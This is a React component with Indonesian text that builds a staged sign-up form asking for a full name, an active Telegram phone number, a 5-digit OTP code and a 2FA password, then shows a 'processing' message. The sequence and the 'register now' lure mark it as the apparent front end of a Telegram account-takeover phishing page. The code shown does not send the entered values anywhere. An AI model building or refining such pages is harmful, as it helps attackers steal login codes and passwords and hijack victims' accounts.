"use client"

import { useState } from "react"
import { Button } from "./ui/button"
import { Input } from "./ui/input"
import { Loader2 } from "lucide-react"

export default function AuthForm() {
  const [step, setStep] = useState(1)
  const [isLoading, setIsLoading] = useState(false)

  const handleNext = () => {
    setIsLoading(true)
    setTimeout(() => {
      setStep(step + 1)
      setIsLoading(false)
    }, 1500)
  }

  if (step === 4) {
    return <div className="p-10 text-center font-bold">Terima kasih, sedang diproses...</div>
  }

  return (
    <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white">
      <div className="mb-6 rounded-xl border overflow-hidden">
        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto" />
      </div>

      <div className="space-y-5">
        {step === 1 && (
          <>
            <div>
              <label className="font-semibold block mb-2">Nama Lengkap:</label>
              <Input placeholder="Masukkan nama" />
            </div>
            <div>
              <label className="font-semibold block mb-2">Nomor Telegram Aktif:</label>
              <Input placeholder="08XXXXXXXXXX" />
            </div>
          </>
        )}

        {step === 2 && (
          <div className="text-center">
            <label className="font-semibold block mb-2">Masukkan Kode OTP</label>
            <Input placeholder="5 Digit" className="text-center" />
          </div>
        )}

        {step === 3 && (
          <div className="text-center">
            <label className="font-semibold block mb-2">Masukkan Kata Sandi (2FA)</label>
            <Input type="password" placeholder="******" className="text-center" />
          </div>
        )}

        <Button 
          onClick={handleNext}
          className="w-full bg-[#1d71d3] text-white py-6 rounded-full font-bold text-lg hover:bg-blue-700 uppercase flex items-center justify-center"
        >
          {isLoading ? <><Loader2 className="mr-2 h-5 w-5 animate-spin" /> MEMPROSES...</> : (step === 1 ? "DAFTAR SEKARANG" : "KONFIRMASI")}
        </Button>
      </div>

      <div className="mt-6 text-left border-t pt-4">
        <p className="text-[12px] text-gray-500">Peringatan:<br/>Pendaftaran hanya akan di masukkan melalui telegram yang aktif!</p>
      </div>
    </div>
  )
}